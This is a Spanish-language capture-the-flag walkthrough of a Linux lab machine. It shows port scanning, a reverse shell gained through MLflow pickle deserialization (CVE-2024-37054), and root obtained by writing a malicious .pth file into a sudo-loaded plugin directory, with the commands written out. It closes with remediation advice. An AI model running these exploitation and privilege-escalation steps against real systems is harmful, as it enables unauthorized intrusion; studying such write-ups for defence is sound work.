Reconocimiento Link to heading

Comenzamos verificando la conectividad con el sistema objetivo 10.129.7.222:

❯ ping -c1 10.129.7.222
PING 10.129.7.222 (10.129.7.222) 56(84) bytes of data.
64 bytes from 10.129.7.222: icmp_seq=1 ttl=63 time=82.4 ms

El TTL de 63 nos indica que la máquina es un sistema operativo Linux.

Escaneo de puertos Link to heading

Realizamos un escaneo agresivo para descubrir todos los puertos TCP abiertos:

❯ nmap -p- --open -sS --min-rate 5000 10.129.7.222 -n -oG nmap/allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Profundizamos en los servicios encontrados identificando versiones y ejecutando scripts de reconocimiento predeterminados:

Identificamos la redirección hacia smarthire.htb. Añadimos la IP del objetivo a nuestro archivo /etc/hosts:

❯ echo "10.129.7.222 smarthire.htb" | sudo tee -a /etc/hosts

Explotación de MLflow Pickle Deserialization (CVE-2024-37054) Link to heading

La versión 2.14.1 de MLflow es vulnerable a CVE-2024-37054, una falla crítica de deserialización insegura de objetos Python Pickle al registrar nuevos modelos en el Model Registry.

Utilizando el script de explotación CVE-2024-37054-MLflow-reverse-shell:

  1. Generamos el modelo malicioso conteniendo la carga útil de la reverse shell:
❯ python generate_model.py
[+] model.pkl created
  1. Subimos el modelo a la instancia de MLflow:
❯ python3 upload_model.py

  1. Al desencadenar la evaluación del modelo subido, la aplicación deserializa model.pkl y ejecuta nuestro comando, otorgándonos una shell reversa interactiva como el usuario de servicio svcweb:

Enumeración del sistema Link to heading

Revisando los privilegios concedidos a svcweb mediante sudo -l:

svcweb@smarthire:/opt/tools/mlflow_ctl$ sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *

Inspeccionamos el código fuente de /opt/tools/mlflow_ctl/mlflowctl.py:

#!/usr/bin/env python3
from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

Análisis de la Vulnerabilidad: Python Path Hijacking (.pth) Link to heading

El script mlflowctl.py itera dinámicamente sobre todos los subdirectorios dentro de plugins/ e invoca site.addsitedir().

Al verificar los permisos del sistema de archivos sobre los subdirectorios de plugins:

svcweb@smarthire:/opt/tools/mlflow_ctl/plugins$ ls -ld dev
drwxrwxr-x 2 root devs 4096 May 27 10:15 dev

Observamos que el grupo devs tiene permisos de escritura en la carpeta /opt/tools/mlflow_ctl/plugins/dev. Dado que el usuario svcweb pertenece al grupo devs, podemos escribir en ese directorio.

Cuando la función nativa site.addsitedir() de Python procesa una carpeta, evalúa e importa automáticamente cualquier archivo con extensión .pth localizado en dicha ruta, ejecutando el código Python que contenga.

Técnica de escalada Link to heading

Aprovechando este comportamiento, creamos un archivo .pth malicioso en el directorio del plugin dev:

svcweb@smarthire:$ echo "import os; os.system('/bin/bash')" > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth

A continuación, ejecutamos la utilidad mediante sudo:

svcweb@smarthire:$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

El intérprete de Python ejecutado como root procesa exploit.pth e invoca /bin/bash, entregándonos una consola con privilegios de superusuario.

Lecciones aprendidas & Recomendaciones Link to heading

  1. Eliminar credenciales por defecto: La interfaz de administración de MLflow no debe ser desplegada con credenciales predeterminadas (admin:password).
  2. Actualizar MLflow: Actualizar a una versión posterior a 2.14.1 que restrinja el registro y ejecución arbitraria de objetos Pickle.
  3. Hardening de scripts Sudo & permisos de archivos: Los scripts ejecutables mediante sudo nunca deben delegar rutas de carga de módulos a carpetas con permisos de escritura para grupos o usuarios no privilegiados.
